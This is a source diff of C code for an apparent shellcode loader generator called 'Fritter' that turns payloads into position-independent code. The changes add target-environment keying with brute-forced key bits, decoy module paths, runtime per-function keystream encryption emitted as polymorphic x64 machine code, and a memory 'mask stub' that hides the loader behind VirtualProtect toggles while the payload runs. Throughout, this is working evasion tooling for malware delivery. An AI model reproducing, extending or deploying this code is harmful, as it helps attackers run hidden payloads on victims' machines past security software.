-      memcpy(&c->inst->module.x, c->mod, c->mod_len);
+    // decoy module path (config field is larger than the instance field)
+    if(memchr(c->decoy, 0, sizeof(inst->decoy)) == NULL) {
+      DPRINT("Decoy path is too long.");
+      err = FRITTER_ERROR_DECOY_INVALID;
+      goto cleanup;
     }
+    strcpy(inst->decoy, c->decoy);
+
+    // DLL lending its static TLS slot to a native payload
+    if(memchr(c->tls_donor, 0, sizeof(inst->tls_donor)) == NULL) {
+      err = FRITTER_ERROR_INVALID_PARAMETER;
+      goto cleanup;
+    }
+    if(c->mod_type == FRITTER_MODULE_DLL || c->mod_type == FRITTER_MODULE_EXE)
+      strcpy(inst->tls_donor, c->tls_donor);
+    
+    // copy module to the tail of the instance
+    DPRINT("Copying module data to instance");
+    memcpy(&c->inst->module.x, c->mod, c->mod_len);
 
     // Fill instance padding with random bytes
     if(inst_pad_len > 0) {
       gen_random((uint8_t*)inst + inst_len - inst_pad_len, inst_pad_len);
     }
 
+    // Key options: bits of the key the loader must find by trial, and
+    // environment variables of the target mixed into it.
+    gen_random(&inst->kopt, offsetof(FRITTER_INSTANCE, api_cnt) - offsetof(FRITTER_INSTANCE, kopt));
+    inst->kopt = 0;
+    {
+      int      bits = (c->key_brute == 0) ? FRITTER_KEY_BRUTE_DEFAULT : (c->key_brute < 0 ? 0 : c->key_brute);
+      int      slot, used = 0;
+      uint32_t k0, junk;
+
+      for(slot = 0; slot < FRITTER_KEY_ENVS; slot++) used |= (c->key_env[slot][0] != 0);
+      if(c->entropy != FRITTER_ENTROPY_DEFAULT) {
+        // no encryption, no key
+        if(used || c->key_brute > 0) { err = FRITTER_ERROR_INVALID_PARAMETER; goto cleanup; }
+        bits = 0;
+      }
+      if(bits > FRITTER_KEY_BRUTE_MAX) { err = FRITTER_ERROR_INVALID_PARAMETER; goto cleanup; }
+      if(bits != 0 || used) {
+        inst->kchk = fritter_keychk(inst_key.mk, inst_key.ctr);
+        for(slot = 0; slot < FRITTER_KEY_ENVS; slot++) {
+          char     name[64], val[256], *eq = strchr(c->key_env[slot], '=');
+          uint64_t h[2];
+          size_t   i, nl;
+          if(c->key_env[slot][0] == 0) continue;
+          nl = eq ? (size_t)(eq - c->key_env[slot]) : 0;
+          if(nl == 0 || nl >= sizeof(name) || strlen(eq + 1) >= sizeof(val)) { err = FRITTER_ERROR_INVALID_PARAMETER; goto cleanup; }
+          // names and values compare without case, as Windows treats them
+          for(i = 0; i < nl; i++) name[i] = (char)toupper((unsigned char)c->key_env[slot][i]);
+          name[nl] = 0;
+          for(i = 0; eq[1 + i] != 0; i++) val[i] = (char)toupper((unsigned char)eq[1 + i]);
+          val[i] = 0;
+          inst->kenv[slot] = maru(name, inst->iv);
+          h[0] = maru(val, inst->iv ^ inst->kenv[slot]);
+          h[1] = maru(val, ~inst->iv ^ inst->kenv[slot]);
+          for(i = 0; i < FRITTER_KEY_LEN; i++) inst->key.mk[i] ^= ((uint8_t*)h)[i];
+          inst->kopt |= (uint16_t)(0x100 << slot);
+        }
+        if(bits != 0) {
+          // random bits where the missing ones were
+          uint32_t mask = (bits >= 32) ? 0xFFFFFFFFu : ((1u << bits) - 1);
+          gen_random(&junk, sizeof(junk));
+          memcpy(&k0, inst->key.mk, 4);
+          k0 = (k0 & ~mask) | (junk & mask);
+          memcpy(inst->key.mk, &k0, 4);
+        }
+        inst->kopt |= (uint16_t)bits;
+      }
+      inst->kopt ^= (uint16_t)FRITTER_PLAIN_MASK(inst, 5);
+    }
+
+    // nothing from api_cnt on changes after this
+    inst->mac = FRITTER_MAC(inst);
+
     // encrypt instance?
     if(c->entropy == FRITTER_ENTROPY_DEFAULT) {
       DPRINT("Encrypting instance");
-      
-      inst->mac = maru(inst->sig, inst->iv);
-      
+            
       uint8_t *inst_data = (uint8_t*)inst + offsetof(FRITTER_INSTANCE, api_cnt);
       
       fritter_encrypt(
@@ -941,6 +1314,7 @@ cleanup:
     if(err != FRITTER_ERROR_OK) {
       DPRINT("Releasing memory for module due to errors.");
       free(c->mod);
+      c->mod = NULL;   // FritterDelete runs next and must not free it again
     }
     DPRINT("Leaving with error :  %" PRId32, err);
     return err;
@@ -966,8 +1340,8 @@ static int save_file(const char *path, void *data, int len) {
       
     if(out != NULL) {
       DPRINT("Writing %d bytes of %p to %s", len, data, path);
-      fwrite(data, 1, len, out);
-      fclose(out);
+      if(fwrite(data, 1, len, out) != (size_t)len) err = FRITTER_ERROR_FILE_ACCESS;
+      if(fclose(out) != 0) err = FRITTER_ERROR_FILE_ACCESS;
     } else err = FRITTER_ERROR_FILE_ACCESS;
     
     DPRINT("Leaving with error :  %" PRId32, err);
@@ -978,7 +1352,6 @@ static int save_file(const char *path, void *data, int len) {
  * Function: save_loader
  * ----------------------------
  *   Saves the loader to output file. Also saves instance for debug builds.
- *   If the instance type is HTTP, it saves the module to file.
  *
  *   INPUT  : Fritter configuration.
  *
@@ -994,12 +1367,6 @@ static int save_loader(PFRITTER_CONFIG c) {
       save_file("instance", c->inst, c->inst_len);
     #endif
 
-    // If the module will be stored on a remote server
-    if(c->inst_type == FRITTER_INSTANCE_HTTP) {
-      DPRINT("Saving %s to file.", c->modname);
-      save_file(c->modname, c->mod, c->mod_len);
-    }
-              
     // no output file specified?
     if(c->output[0] == 0) {
       // set to default name based on format
@@ -1040,11 +1407,21 @@ static int save_loader(PFRITTER_CONFIG c) {
       return FRITTER_ERROR_FILE_ACCESS;
     }
     
+    {
+      // the source formats: variable name and line width per output
+      static const uint8_t widths[8] = {8, 10, 12, 14, 16, 18, 20, 24};
+      char    name[32];
+      uint8_t r = 0;
+      if(gen_domain_name(name) && gen_random(&r, 1)) {
+        name[0] = (char)(name[0] + 32);
+        format_style(name, widths[r & 7]);
+      }
+    }
     switch(c->format) {
       case FRITTER_FORMAT_BINARY: {
         DPRINT("Saving loader as binary");
-        fwrite(c->pic, 1, c->pic_len, fd);
-        err = FRITTER_ERROR_OK;
+        err = (fwrite(c->pic, 1, c->pic_len, fd) == (size_t)c->pic_len)
+              ? FRITTER_ERROR_OK : FRITTER_ERROR_FILE_ACCESS;
         break;
       }
       case FRITTER_FORMAT_BASE64: {
@@ -1053,8 +1430,11 @@ static int save_loader(PFRITTER_CONFIG c) {
         break;
       }
       case FRITTER_FORMAT_RUBY:
+        DPRINT("Saving loader as Ruby string");
+        err = ruby_template(c->pic, c->pic_len, fd);
+        break;
       case FRITTER_FORMAT_C:
-        DPRINT("Saving loader as C/Ruby string");
+        DPRINT("Saving loader as C string");
         err = c_ruby_template(c->pic, c->pic_len, fd);
         break;
       case FRITTER_FORMAT_PYTHON:
@@ -1243,32 +1623,32 @@ static uint32_t emit_mov_r32_at_ptr(uint8_t *out, uint8_t dst, uint8_t base, int
     return (uint32_t)(p - out);
 }
 
-/* Emit `movzx <dst>d, byte [<base>+disp8]`. */
-static uint32_t emit_movzx_r32_mem8(uint8_t *out, uint8_t dst, uint8_t base, int8_t disp) {
-    uint8_t *p = out;
-    uint8_t dst_high  = (dst  >= 8) ? 1 : 0;
-    uint8_t base_high = (base >= 8) ? 1 : 0;
-    uint8_t dst_low3  = dst  & 7;
-    uint8_t base_low3 = base & 7;
-    *p++ = 0x40 | (dst_high << 2) | base_high;    /* REX W=0 R=dst B=base */
-    *p++ = 0x0F; *p++ = 0xB6;                      /* MOVZX r32, r/m8      */
-    if(base_low3 == 4) {
-        *p++ = 0x40 | (dst_low3 << 3) | 4;
-        *p++ = 0x24;
-        *p++ = (uint8_t)disp;
-    } else {
-        *p++ = 0x40 | (dst_low3 << 3) | base_low3;
-        *p++ = (uint8_t)disp;
+/* The keystream a protected section is XORed with: a 32-bit xorshift state
+ * seeded per section, its low byte used for each data byte in turn. The
+ * shift triple and the direction through the section are drawn per output
+ * and compiled into the dispatcher's two loops. */
+typedef struct { uint8_t sh[3]; uint8_t rev; } fn_stream_t;
+
+/* Apply the keystream to a section (self-inverse). Returns 0 if the state
+ * comes back to the seed inside the section, i.e. the stream would repeat. */
+static int fn_stream_xor(uint8_t *buf, uint32_t size, uint32_t seed, const fn_stream_t *st, int apply) {
+    uint32_t k = seed;
+    for(uint32_t i = 0; i < size; i++) {
+      if(apply) buf[st->rev ? size - 1 - i : i] ^= (uint8_t)k;
+      k ^= k << st->sh[0];
+      k ^= k >> st->sh[1];
+      k ^= k << st->sh[2];
+      if(k == seed) return 0;
     }
-    return (uint32_t)(p - out);
+    return 1;
 }
 
-/* Emit one XOR-in-place loop that toggles a region with a byte key.
+/* Emit one XOR-in-place loop that toggles a region with the keystream.
  *
  * Caller pre-loads:
  *   rax       = base address of region
  *   size_reg  = size in bytes (upper 32 bits zero, comes from `mov r32,...`)
- *   key_reg   = byte key (in low 8 bits)
+ *   key_reg   = keystream state (32 bits); advanced by the loop
  *
  * size_reg and key_reg are register indices in the 12..15 range (r12..r15).
  * They're chosen by the dispatcher's per-build role rotation and passed
@@ -1305,7 +1685,7 @@ static uint32_t emit_movzx_r32_mem8(uint8_t *out, uint8_t dst, uint8_t base, int
  *   rax, helper reg, and flags all clobbered, caller must restore
  *   rax if needed (dispatcher reloads from rdi for loop2).
  */
-static uint32_t emit_xor_loop(uint8_t *out, uint8_t size_reg, uint8_t key_reg) {
+static uint32_t emit_xor_loop(uint8_t *out, uint8_t size_reg, uint8_t key_reg, const fn_stream_t *st) {
     /* rex_b = REX.B (r/m extension) or REX.R (reg extension), same
        bit numeric value in the REX byte; low3 = 3-bit register field.
        Excludes rbp (5), not in NONVOL_REGS push list. */
@@ -1321,7 +1701,10 @@ static uint32_t emit_xor_loop(uint8_t *out, uint8_t size_reg, uint8_t key_reg) {
     gen_random(rnd, 3);
     gen_random(jrnd, 4);
     uint32_t cidx       = rnd[0] % 6;
-    int      rev        = rnd[1] & 1;
+    uint32_t tidx       = (cidx + 1 + (rnd[1] >> 1) % 5) % 6;   /* second helper, for the state update */
+    int      rev        = st->rev;                              /* fixed: the stream runs one way */
+    uint8_t  trex = CTR[tidx].rex_b;
+    uint8_t  tlow = CTR[tidx].low3;
     int      addr_shape = rnd[2] & 1;
     uint8_t  crex = CTR[cidx].rex_b;
     uint8_t  clow = CTR[cidx].low3;
@@ -1391,6 +1774,23 @@ static uint32_t emit_xor_loop(uint8_t *out, uint8_t size_reg, uint8_t key_reg) {
     *p++ = 0x30;
     *p++ = (key_low3 << 3);
 
+    /* advance the state: key ^= key << a; key ^= key >> b; key ^= key << c */
+    for(int s = 0; s < 3; s++) {
+        /* mov T_d, key_d   REX: R=1 (key high), B=trex; opcode 89 */
+        *p++ = 0x44 | trex;
+        *p++ = 0x89;
+        *p++ = 0xC0 | (key_low3 << 3) | tlow;
+        /* shl/shr T_d, imm8   opcode C1 /4 or /5 */
+        if(trex) *p++ = 0x41;
+        *p++ = 0xC1;
+        *p++ = ((s == 1) ? 0xE8 : 0xE0) | tlow;
+        *p++ = st->sh[s];
+        /* xor key_d, T_d   REX: R=trex, B=1 (key high); opcode 31 */
+        *p++ = 0x41 | (trex << 2);
+        *p++ = 0x31;
+        *p++ = 0xC0 | (tlow << 3) | key_low3;
+    }
+
     XJUNK(1);
 
     /* inc/dec rax (64-bit forms only, 32-bit inc eax would zero the
@@ -1437,18 +1837,25 @@ static uint32_t emit_xor_loop(uint8_t *out, uint8_t size_reg, uint8_t key_reg) {
  *
  * Frame layout after prologue (rsp-relative):
  *   [+0x00..+0x1F] shadow space for the callee we CALL
- *   [+0x20..+0x27] spilled rcx
- *   [+0x28..+0x2F] spilled rdx
- *   [+0x30..+0x37] spilled r8
- *   [+0x38..+0x3F] spilled r9
- *   [+0x40..+0x47] rax save (callee's return value across re-encrypt)
- *   [+0x48..+0x5F] pad
+ *   [+0x20..+0x3F] copies of the caller's stack args 5..8, so the callee
+ *                  finds them where the Win64 ABI puts them
+ *   [+0x40..+0x47] spilled rcx
+ *   [+0x48..+0x4F] spilled rdx
+ *   [+0x50..+0x57] spilled r8
+ *   [+0x58..+0x5F] spilled r9
+ *   [+0x60..+0x67] rax save (callee's return value across re-encrypt)
+ *   [+0x68..+0x6F] pad
+ *
+ * Protected functions may take at most DISPATCH_MAX_ARGS (8) arguments.
  */
+#define DISPATCH_FRAME      0x70u
+#define DISPATCH_MAX_ARGS   8
 static uint32_t emit_dispatcher(uint8_t *out,
                                 uint32_t self_off,
                                 uint32_t loader_off,
                                 uint32_t ft_off,
-                                int      input_swap)
+                                int      input_swap,
+                                const fn_stream_t *st)
 {
     uint8_t *p = out;
     /* input_swap agrees with emit_thunk on which volatile scratch reg
@@ -1472,7 +1879,7 @@ static uint32_t emit_dispatcher(uint8_t *out,
          PTR: fn_entry ptr, later loader_base, 64-bit
          OFF: fn_entry.offset, u32 (upper 32 zeroed by mov r32)
          SZ:  fn_entry.size  , u32
-         KEY: fn_entry.key   , byte in low 8
+         KEY: keystream state, u32 (seed from fn_entry)
        emit_xor_loop is passed SZ and KEY so the XOR-loop opcodes vary
        with the rotation as well. */
     static const uint8_t STATE_REGS[4] = {12, 13, 14, 15};
@@ -1499,7 +1906,7 @@ static uint32_t emit_dispatcher(uint8_t *out,
      * order per build. Pop order in the epilogue mirrors this array
      * in reverse. Reg ids: 3=rbx, 6=rsi, 7=rdi, 12=r12, 13=r13,
      * 14=r14, 15=r15. Total push bytes = 3*1 + 4*2 = 11 regardless
-     * of order, so frame layout after `sub rsp, 0x60` is unchanged.
+     * of order, so frame layout after `sub rsp, 0x70` is unchanged.
      * RSP: 8 mod 16 on entry (from CALL), 7 pushes → 0 mod 16. */
     static const uint8_t NONVOL_REGS[7] = {3, 6, 7, 12, 13, 14, 15};
     uint8_t save_order[7];
@@ -1538,7 +1945,7 @@ static uint32_t emit_dispatcher(uint8_t *out,
         if(i < 6) EMIT_JUNK();  /* gap between consecutive pushes */
     }
 
-    *p++ = 0x48; *p++ = 0x83; *p++ = 0xEC; *p++ = 0x60;  /* sub rsp, 0x60 */
+    *p++ = 0x48; *p++ = 0x83; *p++ = 0xEC; *p++ = (uint8_t)DISPATCH_FRAME;  /* sub rsp, 0x70 */
 
     /* --- Spill arg regs into frame --- */
     /* EMIT_JUNK() between spills breaks the 20-byte block of 4
@@ -1546,13 +1953,24 @@ static uint32_t emit_dispatcher(uint8_t *out,
        0F 1F /r don't touch flags, don't reference memory, and are
        safe between any mov/mov, mov/lea, add/mov, or mov/call pair
        in this middle section. */
-    *p++ = 0x48; *p++ = 0x89; *p++ = 0x4C; *p++ = 0x24; *p++ = 0x20; /* mov [rsp+0x20], rcx */
+    *p++ = 0x48; *p++ = 0x89; *p++ = 0x4C; *p++ = 0x24; *p++ = 0x40; /* mov [rsp+0x40], rcx */
     EMIT_JUNK();
-    *p++ = 0x48; *p++ = 0x89; *p++ = 0x54; *p++ = 0x24; *p++ = 0x28; /* mov [rsp+0x28], rdx */
+    *p++ = 0x48; *p++ = 0x89; *p++ = 0x54; *p++ = 0x24; *p++ = 0x48; /* mov [rsp+0x48], rdx */
     EMIT_JUNK();
-    *p++ = 0x4C; *p++ = 0x89; *p++ = 0x44; *p++ = 0x24; *p++ = 0x30; /* mov [rsp+0x30], r8  */
+    *p++ = 0x4C; *p++ = 0x89; *p++ = 0x44; *p++ = 0x24; *p++ = 0x50; /* mov [rsp+0x50], r8  */
     EMIT_JUNK();
-    *p++ = 0x4C; *p++ = 0x89; *p++ = 0x4C; *p++ = 0x24; *p++ = 0x38; /* mov [rsp+0x38], r9  */
+    *p++ = 0x4C; *p++ = 0x89; *p++ = 0x4C; *p++ = 0x24; *p++ = 0x58; /* mov [rsp+0x58], r9  */
+
+    /* --- Forward stack args 5..8 into the callee's outgoing-arg slots.
+       At entry the caller's 5th arg is at [rsp_entry+0x28]; after 7 pushes
+       and the frame that is [rsp + FRAME + 0x38 + 0x28]. rax is free here. */
+    for(int a = 0; a < DISPATCH_MAX_ARGS - 4; a++) {
+        uint32_t src = DISPATCH_FRAME + 0x38u + 0x28u + (uint32_t)a * 8u;
+        *p++ = 0x48; *p++ = 0x8B; *p++ = 0x84; *p++ = 0x24;       /* mov rax, [rsp+src] */
+        memcpy(p, &src, 4); p += 4;
+        *p++ = 0x48; *p++ = 0x89; *p++ = 0x44; *p++ = 0x24;       /* mov [rsp+0x20+a*8], rax */
+        *p++ = (uint8_t)(0x20 + a * 8);
+    }
 
     /* --- Locate fn_table entry: rsi = &fn_table_area[16 + id*12] --- */
     *p++ = 0x48; *p++ = 0x8D; *p++ = 0x35;          /* lea rsi, [rip+ft_disp] */
@@ -1585,7 +2003,7 @@ static uint32_t emit_dispatcher(uint8_t *out,
     EMIT_JUNK();
     p += emit_mov_r32_at_ptr(p, SZ,  PTR, 4);   /* mov SZ_d,  [PTR+4]      (size)   */
     EMIT_JUNK();
-    p += emit_movzx_r32_mem8(p, KEY, PTR, 8);   /* movzx KEY_d, byte [PTR+8] (key)  */
+    p += emit_mov_r32_at_ptr(p, KEY, PTR, 8);   /* mov KEY_d, [PTR+8]      (seed)   */
 
     /* --- Compute loader_base into PTR (reuse, done with fn_entry ptr) --- */
     EMIT_JUNK();
@@ -1610,18 +2028,22 @@ static uint32_t emit_dispatcher(uint8_t *out,
        64-bit reg is fine, high 32 bits are 0. */
     *p++ = 0x48; *p++ = 0x89; *p++ = 0xC7;          /* mov rdi, rax (save decrypt base) */
 
-    /* XOR-decrypt: randomized helper, direction, shape, and body junk.
+    /* The loop advances KEY; OFF is no longer needed and keeps the seed
+       across the call for the second loop.  mov OFF_d, KEY_d */
+    *p++ = 0x45; *p++ = 0x89; *p++ = 0xC0 | ((KEY & 7) << 3) | OFF_low3;
+
+    /* XOR-decrypt: randomized helpers, shape, and body junk.
        size_reg=SZ, key_reg=KEY driven by the role rotation. */
-    p += emit_xor_loop(p, SZ, KEY);
+    p += emit_xor_loop(p, SZ, KEY, st);
 
     /* --- Restore args and call callee at loader_base + r10 --- */
-    *p++ = 0x48; *p++ = 0x8B; *p++ = 0x4C; *p++ = 0x24; *p++ = 0x20; /* mov rcx, [rsp+0x20] */
+    *p++ = 0x48; *p++ = 0x8B; *p++ = 0x4C; *p++ = 0x24; *p++ = 0x40; /* mov rcx, [rsp+0x40] */
     EMIT_JUNK();
-    *p++ = 0x48; *p++ = 0x8B; *p++ = 0x54; *p++ = 0x24; *p++ = 0x28; /* mov rdx, [rsp+0x28] */
+    *p++ = 0x48; *p++ = 0x8B; *p++ = 0x54; *p++ = 0x24; *p++ = 0x48; /* mov rdx, [rsp+0x48] */
     EMIT_JUNK();
-    *p++ = 0x4C; *p++ = 0x8B; *p++ = 0x44; *p++ = 0x24; *p++ = 0x30; /* mov r8,  [rsp+0x30] */
+    *p++ = 0x4C; *p++ = 0x8B; *p++ = 0x44; *p++ = 0x24; *p++ = 0x50; /* mov r8,  [rsp+0x50] */
     EMIT_JUNK();
-    *p++ = 0x4C; *p++ = 0x8B; *p++ = 0x4C; *p++ = 0x24; *p++ = 0x38; /* mov r9,  [rsp+0x38] */
+    *p++ = 0x4C; *p++ = 0x8B; *p++ = 0x4C; *p++ = 0x24; *p++ = 0x58; /* mov r9,  [rsp+0x58] */
 
     /* Compute callee entry: rax = loader_base + target_reg (r10 or r11) */
     EMIT_JUNK();
@@ -1642,20 +2064,22 @@ static uint32_t emit_dispatcher(uint8_t *out,
     *p++ = 0xFF; *p++ = 0xD0;                       /* call rax */
 
     /* Save return value */
-    *p++ = 0x48; *p++ = 0x89; *p++ = 0x44; *p++ = 0x24; *p++ = 0x40; /* mov [rsp+0x40], rax */
+    *p++ = 0x48; *p++ = 0x89; *p++ = 0x44; *p++ = 0x24; *p++ = 0x60; /* mov [rsp+0x60], rax */
 
     /* --- XOR-re-encrypt callee region using saved base (rdi) --- */
     *p++ = 0x48; *p++ = 0x89; *p++ = 0xF8;          /* mov rax, rdi */
 
-    /* Independent roll of helper, direction, shape, and junk from loop1;
+    *p++ = 0x45; *p++ = 0x89; *p++ = 0xC0 | (OFF_low3 << 3) | (KEY & 7);   /* mov KEY_d, OFF_d (seed) */
+
+    /* Independent roll of helpers, shape, and junk from loop1;
        same size_reg/key_reg driven by the role rotation. */
-    p += emit_xor_loop(p, SZ, KEY);
+    p += emit_xor_loop(p, SZ, KEY, st);
 
     /* Restore rax (callee's return value) */
-    *p++ = 0x48; *p++ = 0x8B; *p++ = 0x44; *p++ = 0x24; *p++ = 0x40; /* mov rax, [rsp+0x40] */
+    *p++ = 0x48; *p++ = 0x8B; *p++ = 0x44; *p++ = 0x24; *p++ = 0x60; /* mov rax, [rsp+0x60] */
 
     /* --- Epilogue: pop in reverse of the prologue's save_order --- */
-    *p++ = 0x48; *p++ = 0x83; *p++ = 0xC4; *p++ = 0x60; /* add rsp, 0x60 */
+    *p++ = 0x48; *p++ = 0x83; *p++ = 0xC4; *p++ = (uint8_t)DISPATCH_FRAME; /* add rsp, 0x70 */
     for(int i = 6; i >= 0; i--) {
         uint8_t r = save_order[i];
         if(r < 8) {
@@ -1673,9 +2097,391 @@ static uint32_t emit_dispatcher(uint8_t *out,
     return (uint32_t)(p - out);
 }
 
-/* Rough upper bound for the emitted dispatcher (used to reserve buffer
-   space). Actual size is ~186-240 with XOR-loop shape variation. */
-#define DISPATCHER_MAX_SIZE 384u
+/* Upper bound for the emitted dispatcher (used to reserve buffer
+   space). Worst case is about 480 bytes with every junk gap taken. */
+/* shift triples with the full period of 2^32-1 (checked exhaustively) */
+static const uint8_t XS_TRIPLES[36][3] = {
+    {1,3,10},{1,5,16},{1,5,19},{1,9,29},{1,11,6},{1,11,16},{1,19,3},{1,21,20},{1,27,27},
+    {2,5,15},{2,5,21},{2,7,7},{2,7,9},{2,7,25},{2,9,15},{2,15,17},{2,15,25},{2,21,9},
+    {3,1,14},{3,3,26},{3,3,28},{3,3,29},{3,5,20},{3,5,22},{3,5,25},{3,7,29},{3,13,7},
+    {5,13,6},{5,17,13},{6,21,7},{7,1,9},{13,17,5},{13,17,15},{9,11,19},{11,21,13},{5,9,7}};
+
+/* ---- mask stub -------------------------------------------------------
+ * One page at the very end of the shellcode. While the payload runs it is
+ * the only executable page: everything from the shim up to it is XORed
+ * with a dword keystream and made read/write.
+ *
+ *   call entry: forwards to slot TARGET with the caller's arguments and
+ *               stack untouched; masks before, unmasks when it returns.
+ *   exit entry: stands in for the shim's exit hook, which is masked. The
+ *               entering thread unmasks and goes on to the hook, any other
+ *               thread goes to slot THREAD.
+ *   inbound thunks: one per loader function that outside code calls while
+ *               the loader is masked (the script host's methods). Unmasks,
+ *               forwards with arguments and stack untouched, masks again
+ *               when the function returns. Passes straight through when
+ *               the loader is not masked.
+ *
+ * Return addresses go on a small stack in the slots, so a masked call made
+ * from inside an inbound call (WScript.Sleep) nests.
+ *
+ * The loader fills the slots at the start of the page (FRITTER_MASK_*).
+ * Registers, shift triple, seed, junk and block positions are drawn per
+ * output. */
+#define MASK_PAGE       4096u
+#define MASK_STUB_BUILT (LOADER_PEB1_FN_COUNT > 1 && LOADER_PEB2_FN_COUNT > 1)
+
+/* op reg, [rip -> page+to]; `trail` = immediate bytes that follow */
+static uint8_t *mk_rip(uint8_t *p, const uint8_t *pg, int w, uint8_t op, uint8_t reg,
+                       int32_t to, int trail) {
+    uint8_t rex = (uint8_t)((w ? 8 : 0) | ((reg >> 3) << 2));
+    int32_t d;
+    if(rex) *p++ = 0x40 | rex;
+    *p++ = op;
+    *p++ = 0x05 | ((reg & 7) << 3);
+    d = to - (int32_t)((p + 4 + trail) - pg);
+    memcpy(p, &d, 4);
+    return p + 4;
+}
+
+/* 32-bit op dst, src (register form) */
+static uint8_t *mk_r32(uint8_t *p, uint8_t op, uint8_t dst, uint8_t src) {
+    uint8_t rex = (uint8_t)(((src >> 3) << 2) | (dst >> 3));
+    if(rex) *p++ = 0x40 | rex;
+    *p++ = op;
+    *p++ = 0xC0 | ((src & 7) << 3) | (dst & 7);
+    return p;
+}
+
+/* VirtualProtect(...) with [rsp+0x20] as the old-protection slot.
+ * kind 0: loader range -> RW, 1: this page -> RX, 2: both -> RWX */
+static uint8_t *mk_vp(uint8_t *p, const uint8_t *pg, int kind, uint8_t r) {
+    static const uint8_t prot[3] = {0x04, 0x20, 0x40};
+    int i;
+    for(i = 0; i < 4; i++) {
+      switch((i + r) & 3) {
+        case 0:
+          if(kind == 1) p = mk_rip(p, pg, 1, 0x8D, 1, 0, 0);                        // lea rcx, [page]
+          else          p = mk_rip(p, pg, 1, 0x8B, 1, FRITTER_MASK_PBASE * 8, 0);  // mov rcx, [pbase]
+          break;
+        case 1:
+          if(kind == 1) { *p++ = 0xBA; *p++ = 0; *p++ = 0x10; *p++ = 0; *p++ = 0; }  // mov edx, 0x1000
+          else {
+            p = mk_rip(p, pg, 1, 0x8B, 2, FRITTER_MASK_PLEN * 8, 0);                // mov rdx, [plen]
+            if(kind == 2) { *p++ = 0x48; *p++ = 0x81; *p++ = 0xC2;                   // add rdx, 0x1000
+                            *p++ = 0; *p++ = 0x10; *p++ = 0; *p++ = 0; }
+          }
+          break;
+        case 2:
+          *p++ = 0x41; *p++ = 0xB8; *p++ = prot[kind]; *p++ = 0; *p++ = 0; *p++ = 0; // mov r8d, prot
+          break;
+        default:
+          *p++ = 0x4C; *p++ = 0x8D; *p++ = 0x4C; *p++ = 0x24; *p++ = 0x20;           // lea r9, [rsp+0x20]
+          break;
+      }
+      if((r >> (4 + i)) & 1) p += emit_rnd_nop(p, 1 + ((r >> (i + 1)) & 3));
+    }
+    return mk_rip(p, pg, 0, 0xFF, 2, FRITTER_MASK_VP * 8, 0);                        // call [vp]
+}
+
+/* Fill the page `pg`; the masked range is the mask_len bytes before it. */
+static int emit_mask_page(uint8_t *pg, uint32_t mask_len) {
+    uint8_t  rnd[64], reg[7] = {0, 1, 2, 8, 9, 10, 11}, ar[4] = {1, 2, 8, 9}, t;
+    uint8_t  *p, *crypt, *xloop, *unmask, *back, *inback, *incommon, *loop, *jne, *je, P, C, K, T;
+    uint32_t tbase;
+    const uint8_t *sh;
+    uint32_t seed, seed2, cnt = mask_len / 4, n = 0, i, j;
+    uint16_t off;
+    int32_t  d;
+    int      blk, first;
+
+    if(!gen_random(pg, MASK_PAGE) || !gen_random(rnd, sizeof(rnd))) return 0;
+    do { if(!gen_random(&seed, 4) || !gen_random(&seed2, 4)) return 0; } while(seed == 0 || seed2 == 0);
+    #define RB   (rnd[n++ % sizeof(rnd)])
+    #define JK   do { uint8_t j_ = RB; if(j_ & 1) p += emit_rnd_nop(p, 1 + ((j_ >> 1) & 7)); } while(0)
+    #define SLOT(k) ((int32_t)((k) * 8))
+    #define ARGSLOT(r_) SLOT(FRITTER_MASK_ARGS + ((r_) == 1 ? 0 : (r_) == 2 ? 1 : (r_) == 8 ? 2 : 3))
+    for(i = 6; i > 0; i--) { j = RB % (i + 1); t = reg[i]; reg[i] = reg[j]; reg[j] = t; }
+    P = reg[0]; C = reg[1]; K = reg[2]; T = reg[3];
+    sh = XS_TRIPLES[RB % 36];
+
+    /* state the stub reads before anything writes it */
+    memset(pg + SLOT(FRITTER_MASK_FLAG), 0, 8);
+    memset(pg + SLOT(FRITTER_MASK_SP),   0, 8);
+    memset(pg + SLOT(FRITTER_MASK_NIN),  0, 8);
+    /* push rax / pop to jmp on the return stack; r10 and r11 are free at every use */
+    #define STK_PUSH_RAX do { \
+        p = mk_rip(p, pg, 1, 0x8B, 11, SLOT(FRITTER_MASK_SP), 0);         /* mov r11, [sp]         */ \
+        p = mk_rip(p, pg, 1, 0x8D, 10, SLOT(FRITTER_MASK_STK), 0);        /* lea r10, [stk]        */ \
+        *p++ = 0x4B; *p++ = 0x89; *p++ = 0x04; *p++ = 0xDA;               /* mov [r10+r11*8], rax  */ \
+        p = mk_rip(p, pg, 1, 0xFF, 0, SLOT(FRITTER_MASK_SP), 0);          /* inc qword [sp]        */ \
+      } while(0)
+    #define STK_POP_R10R11 do { \
+        p = mk_rip(p, pg, 1, 0xFF, 1, SLOT(FRITTER_MASK_SP), 0);          /* dec qword [sp]        */ \
+        p = mk_rip(p, pg, 1, 0x8B, 11, SLOT(FRITTER_MASK_SP), 0);         /* mov r11, [sp]         */ \
+        p = mk_rip(p, pg, 1, 0x8D, 10, SLOT(FRITTER_MASK_STK), 0);        /* lea r10, [stk]        */ \
+      } while(0)
+
+    p = pg + FRITTER_MASK_SLOTS * 8 + (RB & 0x3F);
+
+    /* xloop: XOR C dwords at P with the keystream from state K (self-inverse) */
+    xloop = p;
+    loop = p;
+    t = (uint8_t)(((K >> 3) << 2) | (P >> 3));
+    if(t) *p++ = 0x40 | t;
+    *p++ = 0x31; *p++ = ((K & 7) << 3) | (P & 7);                         // xor [P], K
+    for(i = 0; i < 3; i++) {
+      p = mk_r32(p, 0x89, T, K);                                          // mov T, K
+      if(T >> 3) *p++ = 0x41;
+      *p++ = 0xC1; *p++ = ((i == 1) ? 0xE8 : 0xE0) | (T & 7); *p++ = sh[i]; // shl/shr T, n
+      p = mk_r32(p, 0x31, K, T);                                          // xor K, T
+    }
+    JK;
+    *p++ = 0x48 | (P >> 3); *p++ = 0x83; *p++ = 0xC0 | (P & 7); *p++ = 4; // add P, 4
+    if(C >> 3) *p++ = 0x41;
+    *p++ = 0xFF; *p++ = 0xC8 | (C & 7);                                   // dec C
+    *p++ = 0x75; *p = (uint8_t)(loop - (p + 1)); p++;                     // jnz loop
+    *p++ = 0xC3;
+    p += RB & 0x1F;
+
+    /* crypt: the shim and loader, then the instance copy */
+    crypt = p;
+    p = mk_rip(p, pg, 1, 0x8D, P, -(int32_t)mask_len, 0);                 // lea P, [first masked byte]
+    JK;
+    if(C >> 3) *p++ = 0x41;
+    *p++ = 0xB8 | (C & 7); memcpy(p, &cnt, 4); p += 4;                    // mov C, dwords
+    if(K >> 3) *p++ = 0x41;
